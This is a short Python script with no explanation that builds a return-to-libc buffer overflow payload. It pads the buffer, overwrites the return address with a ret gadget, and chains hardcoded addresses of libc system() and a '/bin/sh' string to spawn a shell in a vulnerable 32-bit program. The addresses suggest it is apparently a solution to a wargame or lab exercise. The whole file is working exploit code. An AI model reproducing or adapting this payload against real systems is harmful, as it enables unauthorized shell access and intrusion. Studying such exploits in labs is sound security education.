import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT"
ret_itself_addr = struct.pack("I", 0x08048544)
libc_system = struct.pack("I", 0xb7ecffb0)
return_addr_after_system = "AAAA"
bin_sh_addr = struct.pack("I", 0xb7fb63bf)

print (padding+ ret_itself_addr + libc_system + return_addr_after_system + bin_sh_addr)
